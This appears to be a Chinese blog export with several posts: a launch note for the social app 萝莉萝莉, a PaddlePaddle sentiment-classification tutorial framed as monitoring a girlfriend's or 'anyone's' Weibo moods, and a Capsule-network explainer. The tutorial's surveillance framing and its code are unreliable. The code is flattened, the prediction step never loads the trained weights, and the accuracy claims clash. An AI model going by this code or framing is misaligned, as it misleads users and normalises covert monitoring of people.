我们也依托于人工智能做一些好产品。但是在这之前，我想，我应该做一个面向白领的小众社交圈。 缘由其实在上一版的萝莉萝莉中，有很多在我们的萝莉说发过一些文章了，但是大家都反映，体验不好，现在我们完全改变了策略，我们确实想让很多有想法的年轻人在一个很美好的平台发表自己的想法。于是我们又完善了我们的UI： 我们很多时候都会有一些好的想法，想与其他人交流，在萝莉说，是 一个很好的平台。我们可以发表自己那稍纵即逝的灵感之言，也可以宣泄自己在生活中和工作中遇到的小情绪，总之我们没有任何拘束，生活本该如此。 做远一些我们也看到很多用户给我们的留言，告诉我们这个idea非常不错，希望我们做大一些。于是在3.0版本中，我们又做了付费交友。为什么要做付费交友？我渐渐发现我们身处在一个知识付费的时代，那些真正知识的精华是需要金钱去换取的，而你能获得是通过一些金钱的牺牲来换取获取知识所需要花费的时间。对于一个知识白领来说，他们其实非常乐于做这件事情，因为你的获取的时间节省所带来的价值，可能远远高于你的那么一点金钱。 推广开来，为什么那些有价值的人脉我们不能通过金钱去换取？如果亲爱的读者说我们这个理念过于迂腐或者过于拜金，那就是误解我们了，在萝莉萝莉的付费交友中，我们并没有真正做到付费，最终用户只是会回到微信，去开启他们的交谈，而我们提供的，是一种契约，就是你如果向我发起付费交友的请求，就代表你想用这些金钱来结识我，至于你给不给就看你是否看重我这个人脉了。有了一个知己，消费一些金钱，何乐而不为呢，权当是为朋友买单罢了。 我们做的不是付费交友。这是一个矛盾的话题，为什么又说不是付费交友呢？我们真正做的是倡导一种理念，我们希望在现代高度发达的人类社会，我们可以不那么在乎金钱，更加看重人与人之间关系，我想，这样我们会生活的更加幸福。 我们的“野心”做任何事情都是有“野心”，我们也不否认萝莉萝莉从一开始的初衷做一个创意分享平台就没有更大的野心了。或许说追求更合适，毕竟野心显得太野心勃勃。 其实我们要做的，在我们的官网已经展现的淋漓尽致。我们在 www.luoli-luoli.com 就把我们的slogan打出来了，我们要做白领社交领域的Facebook。 我们确实是在这么做，我们希望营造一个社区，一个小的交流机会之所，在不同的城市，认识不同的人，开启不同的际遇，也许你一生中重要的那些人，就是从萝莉萝莉社区开始结识的… 晚来的道歉最后，作为团队负责人，我们对萝莉萝莉的用户的热心表示感谢，但是由于我们这次3.0进行了大手术，对产品重构，不管是后端还是客户端，所以以前的用户信息我们被截取式的转嫁过来了，所以如果有以前的萝莉用户，你们可以完全重新注册一个，开始一个新的体验。我们，一直在这里等你。 怎么找到我们我们隐藏在不远的未来，你可以添加我们的对外微信，备注萝莉萝莉，大家就可以被添加到不同的城市群中，我们会在萝莉萝莉发布不同的城市集结活动，微信： jintianiloveu 当然你也可以添加QQ群： 366590979 我们一起来吐槽~","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"PaddlePaddle文本卷积实现情感分类","slug":"PaddlePaddle文本卷积实现情感分类","date":"2017-11-05T07:43:43.000Z","updated":"2017-11-21T14:44:45.000Z","comments":true,"path":"2017/11/05/PaddlePaddle文本卷积实现情感分类/","link":"","permalink":"http://yoursite.com/2017/11/05/PaddlePaddle文本卷积实现情感分类/","excerpt":"本文介绍 用PaddlePaddle实现一个女朋友微博情感监控AI","text":"本文介绍 用PaddlePaddle实现一个女朋友微博情感监控AI PaddlePaddle文本卷积实现情感分类和微博女友情绪监控AI本期文章我们将使用文本卷积和StackLSTM层来实现一个情感分类网络，这样你就可以拥有一个属于自己的情感监控AI啦，甚至通过微博的接口来监控你女朋友的情绪。而要实现这一切，你不需要别的什么东西，你只需要一个微博认证开发者账号，以及你女朋友的微博ID，当然还有我们牛逼的PaddlePaddle深度学习开发神器。噢，对了，我差点忘记了，首先你要有个女朋友。。。什么？你没有？去淘宝买个二手充气的吧。。。 开个玩笑，其实没有女朋友也没有关系啦，你可以用这个AI来监控任何你想监控的任何一个人。长久以来，人们都希望自己有一个人工智能，我是说，真正的人工智能，可以自动判别人类情感，并且将判别结果告知主人，这样我们就可以从繁琐的刷微博、看朋友圈等浪费时间的却又有时候不得不做的事情中解放出来。设想有一个人工智能可以监控你喜欢的人的微博，甚至监控你的朋友圈，当TA发一些比较消极的消息时，能被我们的智能AI探测到，然后AI会通过邮箱或者短信等手段通知你，你收到之后便可能第一时间给予TA一个深情的安慰…继而发展出一段旷世恋情…听起来非常不错吧？而这个东西就是我们本文要实现的东西。 0. 准备工作啊，在开始之前，我们来捋一捋我们的思路，这将是一个不大却略显复杂的项目。 我们将需要一个微博账号，这个微博账号要能申请到微博接口，并且访问它； 我们需要一个超强的情感分类数据集，毕竟我们是在搞AI，脱离数据都是扯淡； 我们需要用到PaddlePaddle，这在之前我们提到过，它在构建情感分类上有着得天独厚的优势，如果你还没有入门，那么请看看我之前写的入门博客，将PaddlePaddle当做一个轻量级框架来用确实是个不错的主意。 哇，咋一看需要的东西真多，别急让我们一步一步来，我们将会把一些准备工作简单的介绍，但是主要的工作还是在，构建一个情感分类AI。首先当然我们既然要做一个微博情感监控，那么我们肯定要让AI能够access到微博的数据。所以说你要有个微博账号啦，没有的话申请一个。如果你想进一步看到我每天更新的博客文章，也可以来关注关注我啊，强行收粉，传送门. 1. 微博开发者认证及应用创建好吧，有句话怎么说来着，不会后台开发的深度学习工程师不是好设计师….既然我们踏上了一条通往人工智能的不归路那就得下定决心踩着坑了。说起微博开发者认证，你可能需要准备，你的身份证照片等信息。从这里进入开始开发者认证开发者认证连接. 在本文中就不详细说明如何去认证了。一旦认证完了微博开发者，接下来就来创建一个移动应用。当然我们这里创建的移动应用并不是真正的移动应用，而是一个获取API接口的机会。从微博开放平台进入微连接，接入移动应用，这个时候会需要创建一个全新的应用。应用名称就随便填一个吧，应用平台选择其他，因为我们只要做一个Python后台程序，所以也不需要用到什么Android或者iOS SDK，当然啦，你要创建一个应用需要这么一些前提： 你要有一个应用，其实为此你不必要搭建一个网站，可以直接用我的应用网址：www.luoli-luoli.com; 你需要给你的应用取一个名字，这个就随便取啦，只要和已有的不重复即可，然后你可能还需要为你的应用设置一个logo，这个就看个人PS水平了。 这是我申请时候用的app： 如果你好奇为什么叫萝莉萝莉这个名字，是因为我的APP名字叫做萝莉萝莉… 好啦，相信你已经开始操作，操作完之后，你可能需要把这篇文章放入readlist，一天之后再来继续看吧…因为微博应用审核需要一天。 2. 开始构建情感分类深度学习模型我们是一个数据工作者，数据工作者的事情时候需要去自己寻找数据。我们已经有了一个大胆的 设想，做一个人工智能来监控女朋友的反常情感。那么我们肯定需要一些标注的数据集来训练我们的模型，以此来实现一个可以判别情感的AI。在开始搜寻数据之前，让我们来大胆的设想一下，加入我们把情感值分为两类，Positive 和 Negative，可能情况会变得简单一些，这个时候，情感分类的任务就变成了一个二分类问题，我们有时候只需要知道女朋友是开心还是伤心，或者说是中性，而对于其他的情感，我们目前可能不是非常关心。因此，我们将目标锁定在中文情感分类数据集，我们暂且不去考虑分级过多的情感数据集，先从最简单的开始。 让我们来分析一下，要构建一个情感分类模型，初步来想有两种方法： 第一种构建一个正面词汇词库，和一个反面词汇词库，这样每次来一个新的句子的时候我们可以判断是正面词汇多呢，还是反面词汇多，从而来决定一个句子是反面还是正面，尽管这种方法简单易行，但是在遇到比如这样的句子时： 你他妈今天还真的把我当纸老虎了是不? 那么这句话中，他妈实际上是一个消极词汇，但是却不能归到消极词汇中，因为它也可能是一个中性词汇； 第二种当然是使用深度学习的方法啦，深度学习构建出来的复杂模型，不仅仅可以根据标签来判定哪些词汇是正面的，哪些词汇是负面的，同时也能够学习到不同词语在不同语境下所表现出来的消极以及正面性。 在本篇文章中，我们将使用一个stacked LSTM模型和一个文本卷积模型来实现情感的分类，为了简化操作，我们将使用一个英文的电影评价数据集，用这个来做一个简易的英文情感分类器，我们将使用PaddlePaddle训练一个模型来对句子进行精准的分类。当然啦，如果大家希望把这个转移到中文上，我在这里也提供一些中文方面的语料给大家，中国计算机中文信息技术会议的一个微博情感分类标注数据集，该数据集包含了20个话题，其中每个话题有正负两种情感的评论总共约2000余条，下载地址 (百度网盘)在此。这个数据集中，每个话题的评论在一个xml文件中，xml中包含句子和词性标注。 而Imdb数据集非常小巧，我们将在PaddlePaddle的代码中直接实现下载，无需手动下载。 3. PaddlePaddle构建情感分类器 - 文本处理如果之前对PaddlePaddle没有什么了解，那么可以参照我之前写的文章，与其他框架的对比，传送门，简而言之，我们之所以使用PaddlePaddle来构建这么一个应用是基于它的这么一些优点： 快速实现和部署，为什么我说快速，PaddlePaddle有着其他国外框架无法比拟的优势，那就是健全的中文文档，包括像我写的这么一些非官方的文档，对于新手搭建网络来说非常的轻而易举； 轻量级，我认为PaddlePaddle相对于其他的框架来说，轻量是它的一个非常好的优点，它没有TensorFlow那么笨重，除此之外我甚至认为MXNet在轻量级上没有它好。原因很简单，从安装到构建网络到训练我可以在一个脚本文件中完成整个Pipeline。 好啦，闲话不多说，让我们先用PaddlePaddle来玩一些Playground的东西。在PaddlePaddle里面其实是内置了一些数据的，当然啦，这些数据会自动通过网络下载，但是我们可以直接导入它，从而可以知道PaddlePaddle喂入数据的格式到底是什么，闲话不多说，直接上代码： from __future__ import print_functionimport sysimport paddle.v2 as paddlefrom __future__ import print_functionimport sysimport paddle.v2 as paddleimport sysimport osimport jsonimport nltkif __name__ == '__main__': # init paddle.init(use_gpu=False) print('load dictionary...') word_dict = paddle.dataset.imdb.word_dict() print(word_dict) 简单吧，一切就是如此的简洁，大家可以看到打印出来的word dict其实就是一个词袋，后面的数字表示的是这个词的id，为什么要这么处理？这就是涉及到文本处理领域基本的东西了-word bag，词袋法。我们知道一个神经网络模型，不管它多复杂，它的输入其实都是数字向量，那么文本怎么变成数字向量输入到网络里面去呢？我们知道图片输入到网络好理解，因为图片本身就是一个个的像素点啊。那文本要输入网络其实也非常简单，只需要把文字映射成为一个int ID就可以了。至于怎么映射，直接对所有词汇取一个词袋，给它一个ID即可。 毫无疑问，如果大家要构建中文的情感分类器，那原理也是一样的，只不过是对中文语料的进行一个词袋和ID映射的处理。 4. PaddlePaddle构建情感分类器 - 网络构建其实情感分类也是一个分类任务，和图片分类是一样，而且情感分类是一个非常简单的二分类问题。大家如果有想法的话可以发散为三分类四分类问题，那么对应的就是不同的情感等级。我们做一个简易教程，当然无法做到非常深入，但是万变不离其宗，非常期待大家继续跟我一起关注PaddlePaddle的后续发展动态，我会在PaddlePaddle更新API之后不断地维护这些代码以及创造更多的教程来教大家怎么把这个框架用起来。闲话不多说，我们首先思考一下两个问题： 图片分类网络是怎么构建的？ 图片分类的网络可以用来分类文本吗？ 首先我们知道图片分类用CNN分，那么CNN其实它的要求是一个二维的矩阵，文本也和图片是一样的，但是文本通过ID转换之后得到的实际上是一个一维的向量，因为只有一句话。所以在这里有一个东西不得不传授给大家，那就是embedding，这个embedding你可以理解为嵌入，为什么要嵌入，什么是嵌入？这个其实不难理解，意思就是你事先有一个矩阵，这个矩阵的每一个元素是一个随机分布里面取的值，然后你在一个句子中的每一个ID，都映射到这个矩阵当中来，从而得到一个二维的矩阵，达到次嵌入的目的，一般情况下，词嵌入是一个比较复杂的东西，如果把这个东西加入到网络一起训练的话，你甚至可以做你的word2vec模型了，好在PaddlePaddle已经帮我们处理好了这些问题，我们可以直接调用PaddlePaddle里面的embed层来把一维的句子，转成CNN需要的二维。 在转换之前，我们需要看一下Imdb的数据是怎么读取的： def reader_creator(pos_pattern, neg_pattern, word_idx, buffer_size): # this unk is a token UNK = word_idx['&lt;unk&gt;'] # start a quen to using multi-process qs = [Queue.Queue(maxsize=buffer_size), Queue.Queue(maxsize=buffer_size)] def load(pattern, queue): for doc in tokenize(pattern): queue.put(doc) queue.put(None) def reader(): # Creates two threads that loads positive and negative samples # into qs. t0 = threading.Thread( target=load, args=( pos_pattern, qs[0], )) t0.daemon = True t0.start() t1 = threading.Thread( target=load, args=( neg_pattern, qs[1], )) t1.daemon = True t1.start() # Read alternatively from qs[0] and qs[1]. i = 0 doc = qs[i].get() while doc != None: yield [word_idx.get(w, UNK) for w in doc], i % 2 i += 1 doc = qs[i % 2].get() # If any queue is empty, reads from the other queue. i += 1 doc = qs[i % 2].get() while doc != None: yield [word_idx.get(w, UNK) for w in doc], i % 2 doc = qs[i % 2].get() return reader() 这个方法其实已经内置在Paddle中，我们不需要写它，但是为了让大家能够理解，我把它单独拿出来讲解一下，这个函数执行的操作其实非常简单，那就是根据上面所得到的word dict，把文本的每一个句子转换成一维的数字向量。由于Imdb里面是一句正情绪，一句负情绪，所以或有一个 %2的操作。 好了，接下来重点来了，我们要用PaddlePaddle构建我们的模型了，我之前提到了这个embed层，我们直接embed之后，接一个CNN来构建一个简单的文本卷积分类网络： def convolution_net(input_dim, class_dim=2, emb_dim=128, hid_dim=128): # we are starting with a embed layer data = paddle.layer.data(\"word\", paddle.data_type.integer_value_sequence(input_dim)) emb = paddle.layer.embedding(input=data, size=emb_dim) # this convolution is a sequence convolution conv_3 = paddle.networks.sequence_conv_pool( input=emb, context_len=3, hidden_size=hid_dim) conv_4 = paddle.networks.sequence_conv_pool( input=emb, context_len=4, hidden_size=hid_dim) output = paddle.layer.fc( input=[conv_3, conv_4], size=class_dim, act=paddle.activation.Softmax()) lbl = paddle.layer.data(\"label\", paddle.data_type.integer_value(2)) cost = paddle.layer.classification_cost(input=output, label=lbl) return cost, output 可以说，这个网络简直到令人想哭，但是它并不是“简单”，这里面有一个词嵌入操作，紧接着是两个卷积层，注意这里的卷基层并非是图片卷积，而是文本序列卷积，这个应该是PaddlePaddle中特有的一个特殊层，百度在文本序列和语音序列处理上还是有一套，等一下大家会看到，这么一个简单的模型可以在仅仅6个epoch就达到99.99%的精确度。embed的size是128，隐藏层神经元个数是128。大家其实完全不用关系这些网络是怎么连接的，我们把训练的代码写贴上来： from __future__ import print_functionimport sysimport paddle.v2 as paddleimport sysimport osimport jsonimport nltkdef convolution_net(input_dim, class_dim=2, emb_dim=128, hid_dim=128): data = paddle.layer.data(\"word\", paddle.data_type.integer_value_sequence(input_dim)) emb = paddle.layer.embedding(input=data, size=emb_dim) conv_3 = paddle.networks.sequence_conv_pool( input=emb, context_len=3, hidden_size=hid_dim) conv_4 = paddle.networks.sequence_conv_pool( input=emb, context_len=4, hidden_size=hid_dim) output = paddle.layer.fc( input=[conv_3, conv_4], size=class_dim, act=paddle.activation.Softmax()) lbl = paddle.layer.data(\"label\", paddle.data_type.integer_value(2)) cost = paddle.layer.classification_cost(input=output, label=lbl) return cost, output if __name__ == '__main__': # init paddle.init(use_gpu=False) # those lines are get the code print('load dictionary...') word_dict = paddle.dataset.imdb.word_dict() print(word_dict) dict_dim = len(word_dict) class_dim = 2 train_reader = paddle.batch( paddle.reader.shuffle( lambda: paddle.dataset.imdb.train(word_dict), buf_size=1000), batch_size=100) test_reader = paddle.batch( lambda: paddle.dataset.imdb.test(word_dict), batch_size=100) feeding = &#123;'word': 0, 'label': 1&#125; # get the output of the model [cost, output] = convolution_net(dict_dim, class_dim=class_dim) parameters = paddle.parameters.create(cost) adam_optimizer = paddle.optimizer.Adam( learning_rate=2e-3, regularization=paddle.optimizer.L2Regularization(rate=8e-4), model_average=paddle.optimizer.ModelAverage(average_window=0.5)) trainer = paddle.trainer.SGD( cost=cost, parameters=parameters, update_equation=adam_optimizer) def event_handler(event): if isinstance(event, paddle.event.EndIteration): if event.batch_id % 100 == 0: print(\"\\nPass %d, Batch %d, Cost %f, %s\" % ( event.pass_id, event.batch_id, event.cost, event.metrics)) else: sys.stdout.write('.') sys.stdout.flush() if isinstance(event, paddle.event.EndPass): with open('./params_pass_%d.tar' % event.pass_id, 'w') as f: trainer.save_parameter_to_tar(f) result = trainer.test(reader=test_reader, feeding=feeding) print(\"\\nTest with Pass %d, %s\" % (event.pass_id, result.metrics)) inference_topology = paddle.topology.Topology(layers=output) with open(\"./inference_topology.pkl\", 'wb') as f: inference_topology.serialize_for_inference(f) trainer.train( reader=train_reader, event_handler=event_handler, feeding=feeding, num_passes=20) 我们直接来跑起来看一下： 简直amazing，2个epoch之后就达到了90%的准确度!!! 非常非常的impressive！！ 5. PaddlePaddle构建情感分类模型 - 模型部署好了，到了最最重要的时刻来了，我们辛辛苦苦训练了两天两夜的模型，是时候看看它的威力了。此时此刻，你的项目文件夹的目录最少要跟我一样： 我现在只有一个main.py，这里面就是我们训练的脚本。我们有一个inference_topology.pkl，这个是我们的网络模型保存的二进制文件。大家注意了，这是我见过的最清晰的网络保存和权重保存方式！！没有之一！！PaddlePaddle的网络模型保存在了pkl，权重是一个tar的压缩文件！！！。这个比TensorFlow或者MXNet要人性化很多！！MXNet jb的根本不知道保存到哪里去了， TensorFlow还得手动写一个脚本来frozen一个模型，PaddlePaddle一步到位，非常牛逼！！ 为了让大家体验一下预测的快感，我直接把代码贴出来了： # -*- coding: utf-8 -*-# file: predict.py# author: JinTian# time: 16/11/2017 8:17 PM# Copyright 2017 JinTian. All Rights Reserved.## Licensed under the Apache License, Version 2.0 (the \"License\");# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an \"AS IS\" BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.# ------------------------------------------------------------------------import numpy as npimport sysimport paddle.v2 as paddlefrom __future__ import print_functionimport sysimport osimport jsonimport nltkdef convolution_net(input_dim, class_dim=2, emb_dim=128, hid_dim=128, is_predict=False): data = paddle.layer.data(\"word\", paddle.data_type.integer_value_sequence(input_dim)) emb = paddle.layer.embedding(input=data, size=emb_dim) conv_3 = paddle.networks.sequence_conv_pool( input=emb, context_len=3, hidden_size=hid_dim) conv_4 = paddle.networks.sequence_conv_pool( input=emb, context_len=4, hidden_size=hid_dim) output = paddle.layer.fc(input=[conv_3, conv_4], size=class_dim, act=paddle.activation.Softmax()) if not is_predict: lbl = paddle.layer.data(\"label\", paddle.data_type.integer_value(2)) cost = paddle.layer.classification_cost(input=output, label=lbl) return cost else: return outputif __name__ == '__main__': # Movie Reviews, from imdb test paddle.init(use_gpu=False) word_dict = paddle.dataset.imdb.word_dict() dict_dim = len(word_dict) class_dim = 2 reviews = [ 'Read the book, forget the movie!', 'This is a great movie.' ] print(reviews) reviews = [c.split() for c in reviews] UNK = word_dict['&lt;unk&gt;'] input = [] for c in reviews: input.append([[word_dict.get(words, UNK) for words in c]]) # 0 stands for positive sample, 1 stands for negative sample label = &#123;0: 'pos', 1: 'neg'&#125; # Use the network used by trainer out = convolution_net(dict_dim, class_dim=class_dim, is_predict=True) parameters = paddle.parameters.create(out) print(parameters) # out = stacked_lstm_net(dict_dim, class_dim=class_dim, stacked_num=3, is_predict=True) probs = paddle.infer(output_layer=out, parameters=parameters, input=input) print('probs:', probs) labs = np.argsort(-probs) print(labs) for idx, lab in enumerate(labs): print(idx, \"predicting probability is\", probs[idx], \"label is\", label[lab[0]]) 让我们来看一下预测的结果： 6. 后记我们已经可以用PaddlePaddle构建自己的深度学习应用了！！！这次是情感分类！！这是一个非常不错的开端，我们已经有了自己的预测脚本，接下来只需要把我们的预测脚本和你的微博应用程序结合起来，当检测到女友的情绪不稳定时，就通过邮件通知你。当然这部分工作一直到现在我都没有通过微博的审核。。。。（无力吐槽微博ing）。不管怎么用，我们不得不再次赞一下百度PaddlePaddle的开发团队，用PaddlePaddel构建模型没有太多的abstraction，构建出来的模型非常简单便捷，如果要在深度学习和人工智能领域定义一个敏捷开发的代表，那么PaddlePaddle非它莫属啦~~。 7. 扩展实现情感分类其实只是PaddlePaddle应用的冰山一角，我们可以通过这个基础的应用来实现无数的创意深度学习应用，就像Android操作系统一样，虽然底层的API都是一样但是却可以在这个基础之上建造微信，支付宝，直播APP这样的功能多样的应用程序。本文虽然给大家展示的是一个微博情感监控，大家也可以把这个东西应用在自己的APP当中，比如，根据用户发的评论来回复的情感极性来回复相应的话语，比如用在自己的聊天机器人中，使得它更加具有情感性，都是不错的应用。如果大家有什么好的想法和创意，也可以在原始博客下面评论与我互动，我会把更好的idea更新在我后面的博客中，期待你的创意！ 本期列车到此结束，如果大家对本文由任何疑问，欢迎通过微信找到我，也欢迎大家订阅本文的首发地址也是永久更新维护地址： https://jinfagang.github.io This article was original written by Jin Tian, welcome re-post, first come with https://jinfagang.github.io . but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"Capsule下一代CNN深入探索","slug":"Capsule下一代CNN深入探索","date":"2017-11-03T04:46:46.000Z","updated":"2017-11-03T07:56:03.000Z","comments":true,"path":"2017/11/03/Capsule下一代CNN深入探索/","link":"","permalink":"http://yoursite.com/2017/11/03/Capsule下一代CNN深入探索/","excerpt":"本文介绍 Capsule下一代CNN深入探索","text":"本文介绍 Capsule下一代CNN深入探索 Capsule下一代CNN深入探索 This article was original written by Jin Tian, welcome re-post, first come with https://jinfagang.github.io . but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu 牛逼的Hinton大神不仅仅将反向传播引入了神经网络，使得大规模的训练神经网络成为可能，而现在他又提出了一个新的基础结构Capsule，听上去很厉害，但是我们坐以待毙，要站在科技的最前沿去掌握这些新的知识。今天我们就来理解一下这个Capsule到底是什么鬼，有和牛逼之处，以及它和CNN的关系，又该如何去实现它？论文地址传送门 Capsule基础Hinton在他的论文里面，把论文的题目叫做 Dynamic Routing Between Capsules. 那么很显然，首先理解一下为毛叫Routing？这个题目总字面意思理解像是一种动态的算法，在Capsule中游离，具体是怎么一种方法我们继续看了。其实论文摘要的第一句话就说的是什么是Capsule: A capsule is a group of neurons whose activity vector represents the instantiation parameters of a specific type of entity such as an object or object part. 一个胶囊，就是一组神经元，它的特征向量就是代表一个实体或者物体的实例化参数。简而言之，一个胶囊现在是一组神经元了，而不是一个或者一层神经元。一组这个概念非常重要，比如我们将好几层放到一组里面组成一个胶囊，Capsule也是顾名思义。那么这么一个胶囊，它的参数就是一个对象或者物体的实例化参数，比如就是一张图片中一个物体的特征。 用活动向量的长度来代表实例化物体存在的概率，用活动向量的方位来代表。较低层次的胶囊为较高抽象层次的胶囊做预测，当较低层次的多个胶囊对某个预测都表示同意时，高层次的抽象胶囊就将被激活。 Hinton在引入Capsule概念时提到，人类视觉使用了一种确定的固定点序列来忽略不相关的细节，以确保只有极少数部分的光学阵列以最高分辨率被处理。这什么意思呢？就是说，人类的视觉会忽略东西，比如你看远处的一座塔，那么它附近的树木，人就无法看清，人类只能同时聚焦于同一个物体，使得这个物体被以强所未有的分辨率被聚焦。这其实我们已经研究过了，CNN的基本不就是一个聚焦的卷积核对图片进行扫描吗？那么这个新的“CNN”又有何不同呢？接着，作者提出了一个非常犀利的观点，那就是Parse Tree，暂且把它叫做解析树。作者把人类的视觉比较是一个解析树。Parse Tree是一个由神经网络雕刻出来的雕刻品，就像是一个雕塑出自于石头一样，这么一说非常清晰，Parse Tree本质还是神经网络，但是他只是把神经网络当成是原料，而不是直接把神经网络拿来用。这个Parse Tree也是一层层的，而且每一层不再是单一的神经元，而是每一层有许多个胶囊组成，每个胶囊由若干个神经元组成。意思就是Parse Tree使得神经网络更加高级了，并产生了一个以胶囊为单位的层次结构。在解析树的每一层当中，每一个胶囊都会选择更上一层的胶囊作为它的父胶囊，此时父胶囊就会激活。 每个活动胶囊内部的神经网络参数表征了图片当中出现的物体的尺寸，形状，姿态等，甚至包括速度，文本信息都会包含，其中一个非常特别的信息是这个胶囊中是否包含该物体存在的信息，而一个表征是否存在的办法就是在这个胶囊后面接一个分类器输出0和1. 但是在这篇论文作者提出了一个更加牛逼的方式来表征胶囊里面是否存在一个物体的实例化信息，那就是通过胶囊的长度来判别，并且规定胶囊输出的特征长度不能超过1。一个胶囊输出是一个向量，这个天然特性非常好，他可以使得一个胶囊的输出可以被送到它更上层的胶囊中去。刚开始的时候， 一个胶囊的输出被送到所有可能的高层次胶囊中，但是由于总和限定在1，所以被逐渐递减，胶囊会有一个预测向量，乘上一个权重矩阵，如果预测向量与高层次的胶囊输出相乘得到的标量较大，那么就增加了这个胶囊将信息传递给这个高层次胶囊的概率。这种利用底层胶囊和高层胶囊协同合作的方式使得这种办法比简单的maxpooling要有效得多，Hinton等大神也说自己证明了这一点，这个机智在物体分割和检测重叠物体上具有效果。 说到了这里，是该对比一下基于胶囊机制的视觉系统和CNN的区别了。首先有： CNN Capsule scalar output of feature detector vector ouput of Capsules max pool routing-by-agreement 一眼就能看出，新的体系相对于CNN来说，CNN和Capsule的体系架构的区别就像小学数学和微积分，cnn中的max-pooling会很显然会丢失信息，而用routing-by-agreement的方式来处理，图像中物体的位置信息就被选择哪个高层次胶囊所取代了。其实说白了，Capsule架构是把神经网络和决策树结合起来，只不过和决策树决策的方式不一样。 那么问题来了，Capsule的输入和输出怎么计算呢？ 论文中只是说明了一种非常简单的实现方法，那就是挤压函数,这个挤压函数的作用就是把一个低长度的向量的长度压缩到几乎为0，把一个很长长度的向量压缩到一个小于1的值（execuse me？长度还能小于1？？？这里说的length值得应该是二范数的长度），这个公式很显然就是将一个向量归一化了： vj = ||sj||^2 / (1 + ||sj||^2) * sj / ||sj|| 这就是一个Capsule的公式，输入是sj，输出是vj，非常清晰简单明了。 除了第一层的Capsule之外，其他每一层的输入sj是下一层Capsule的输出乘以一个矩阵，在乘上一个耦合概率： 简单的Capsule算法如下： procedure ROUTING(uˆj|i, r, l)for all capsule i in layer l and capsule j in layer (l + 1): bij ← 0.for r iterations do for all capsule i in layer l: ci ← softmax(bi) for all capsule j in layer (l + 1): sj ← i cij uˆj|i for all capsule j in layer (l + 1): vj ← squash(sj ) for all capsule i in layer l and capsule j in layer (l + 1): bij ← bij + uˆj|i.vjreturn vj CapsNet的网络结构Hinton在论文中也提出了CapsNet一个最简单的结构，我们直接看一下图形结构： 一看这个结构感觉跟想象的不太一样啊，说好的胶囊结构呢？这个primary caps就是一个胶囊了吧，那么这个就是3个层次的胶囊？还是说三个初级的胶囊？不是非常清晰啊。不过可以这么来理解，首先primary caps是首要的初级胶囊，这些胶囊就是最底层的胶囊了，每个初级胶囊里面都是一些卷积层组成的网络，比如每个caps里面都是一个lenet，然后每个primary capsules都与更高层次的抽象capsule组成一个激活与被激活的关系，最后抽象出来的capsule就是图中的DigitCaps。这些高层次的Caps不仅仅可以用来分类，直接计算输出的向量的二范数即可，而且还可以用来重构. 这是一个非常有趣的事情，也就是说这里的DigitsCaps已经足够高级了，高级到什么地步，我们可以直接用这个东西来做GAN生成！！！Hinton在论文里面也说了，直接一个decoder就可以用这个来生成相应的数字： 这是一个decoder，直接对DigitCaps进行重构，就得到了一个784维的原始mnist图片。 我们对CapsNet的原始论文的了解大概就是如此，但是我想现在你一定跟现在我一样懵逼。传说中非常牛逼吊炸天的CapsNet好像我依旧不知道它是什么来的，要实现什么功能？解决什么问题？怎么解决的？以及它计算的一些细节。别急，我们再来仔细分析一下。 CapsNet探究简单来说，Hinton提出这个CapsNet是要解决这么一个问题：传统CNN在对图片信息提取的信息遗漏问题和深度学习模型对物体形状记忆的问题。为什么CNN会有这样的问题呢？有人仔细想过为什么我们要用maxpooling这么简单粗暴的东西吗？我们对特征进行一层层的抽象，有很多种办法，为什么一定要直接略过一些东西呢？我们在做检测和分割任务的时候，有人仔细想过为什么一个检测网络总是必须要借助人类的标签才能把物体框柱，而且框的还不准确吗（比如重叠物体）？这些都是目前CNN基石上所存在的问题。 而CapsNet的设计先天有着很好的优点： 通过一个个的胶囊来代替简单的一层CNN，这个非常好理解，现在要是提出一个胶囊网络，它的一层不是多少个神经元，而是多少个胶囊，每个胶囊可能有很多层CNN或者很多个神经元，毫无疑问，这个模型就要复杂很多了。 CapsNet不在使用拍脑袋决定的max-pooling这样的简单粗暴方式来处理特征的抽象或者说抽取，而是采用底层与高层之间的激活与被激活的关系来表征这一关系，比如我在底层有个胶囊A，它抽取了一个车的特征，它就激活它高层的一个胶囊，那么这个胶囊就在底层的基础上进行了一次抽象，至于这个抽象怎么去理解，就当时对图像进行了一次特征抽取吧。 由于CapsNet本身一个胶囊就被设计来发现一个物体，那么这个物体检测出来的特征自然就包含这个物体的类别，这个物体的形状等信息，这一想法在重构的实验中也得到了非常好的验证，底层识别1的胶囊，可以很好的复现1的图形。 正是基于此架构上的改进，未来，可能在做分割或者检测任务时，我们就不需要进行人工标注了，CapsNet可以通过简单的类别标注就可以知道什么地方有什么东西，而且这个检测可以做到非常准备。 从这个角度上来说，说大一些，CapsNet统一了CV里面的分类、检测、分割所有的任务，至于它是不是像设想的一样真的非常work，我想在未来的全球AI研究员的实现里面，肯定会很多人使用Caps对深度学习网络进行重构，无数实验结果或许会给我们带来非常惊喜的成果！","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"PaddlePaddle, TensorFlow, MXNet, Caffe2 , PyTorch五大深度学习框架2017-10最新评测","slug":"PaddlePaddle-TensorFlow等五大深度学习框架最新评测","date":"2017-10-13T06:55:55.000Z","updated":"2017-10-24T12:54:53.000Z","comments":true,"path":"2017/10/13/PaddlePaddle-TensorFlow等五大深度学习框架最新评测/","link":"","permalink":"http://yoursite.com/2017/10/13/PaddlePaddle-TensorFlow等五大深度学习框架最新评测/","excerpt":"本文介绍PaddlePaddle, TensorFlow, MXNet, Caffe2, PyTorch五大深度学习框架2017-10最新评测","text":"本文介绍PaddlePaddle, TensorFlow, MXNet, Caffe2, PyTorch五大深度学习框架2017-10最新评测 PaddlePaddle, TensorFlow, MXNet, Caffe2 , 